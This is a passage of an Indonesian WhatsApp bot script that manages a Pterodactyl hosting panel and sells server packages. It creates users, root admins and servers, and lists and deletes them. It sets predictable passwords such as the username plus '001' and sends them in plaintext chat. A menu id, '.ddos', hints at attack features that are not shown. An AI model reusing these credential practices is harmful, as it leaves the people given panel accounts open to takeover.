id: '.allmenu'
},
{
title: 'Menu DIgital Ocean',
description: `Displays DO Menu`, 
id: '.vpsmen'
},
{
title: 'Menu Domain',
description: `Displays Domain Menu`, 
id: '.domainmenu'
},
{
title: 'Menu Group',
description: `Displays Group Menu`, 
id: '.groupmenu'
},
{
title: 'Menu Other', 
description: "Displays the Other Menu", 
id: '.ddos'
}]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By DitzzXploit', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: DitzzXploit.decodeJid(DitzzXploit.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: text12
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by kayydev')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}\n`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: DitzzXploit.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/6283842671582\",\"merchant_url\":\"https://wa.me/6283842671582\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await DitzzXploit.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isOwner) return reply(`Khusus Zans Official Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case 'updatesrv': {
if (!isOwner) return reply(`Khusus Zans Official Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
                case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await DitzzXploit.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await DitzzXploit.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isOwner) return reply(`Khusus Pedia Official Aja`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isOwner) return reply(`Khusus Pedia Official Aja`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await DitzzXploit.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
DitzzXploit.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
                case "crateadmin": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await DitzzXploit.sendMessage(m.chat, listMessage)

    await DitzzXploit.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await DitzzXploit.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "buyapipm2": {
  if (cekSaldo(sender,db_saldo) < 35000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/apipm2.zip'), caption: 'Nih Yapit, Kau Jual Murah Awas Kontol', mimetype: 'application/zip', fileName: 'apipm2.zip'}, {quoted: m})
minSaldo(sender, 35000, db_saldo)
}
break
case "buyeggpm2": {
  if (cekSaldo(sender,db_saldo) < 30000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
minSaldo(sender, 30000, db_saldo)
}
break
case "buycasepm2": {
  if (cekSaldo(sender,db_saldo) < 45000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
DitzzXploit.sendMessage(from, {document: fs.readFileSync('./freya/caseaddpm2.zip'), caption: 'Nih Kontol, Kau Jual Murah Ku Delete!', mimetype: 'application/zip', fileName: 'caseaddpm2.zip'}, {quoted: m})
minSaldo(sender, 45000, db_saldo)
}
break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 3000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY DitzzXploit Official⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*


NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 3000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
